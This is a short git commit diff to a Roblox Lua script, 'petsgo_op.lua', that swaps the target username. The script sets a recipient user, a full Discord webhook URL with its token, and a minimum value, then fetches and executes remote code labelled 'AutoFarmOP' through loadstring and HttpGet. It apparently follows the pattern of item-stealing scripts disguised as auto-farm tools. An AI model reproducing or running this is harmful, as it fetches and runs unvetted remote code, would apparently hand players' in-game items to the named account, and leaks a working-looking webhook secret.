23775269251d3afe81bf76ef846074fbde354866
Vacumic <vvsdas299@gmail.com>
2024-10-20 21:37:10 +0300

    Update petsgo_op.lua

--- petsgo_op.lua
+++ petsgo_op.lua
@@ -1,4 +1,4 @@
-_G.User = "penikeek"
+_G.User = "fyjhgjjhhh"
 _G.Webhook = "https://discord.com/api/webhooks/1297617074503421992/soGduy-XBnC5qLgGra7x-uNVHY2ZoB8Vxnovs6Q88bMbvOUCOuVL6VDm00DktyxpbHgn"
 _G.Min = 1000000
 loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetsGO/refs/heads/main/AutoFarmOP.lua", true))()
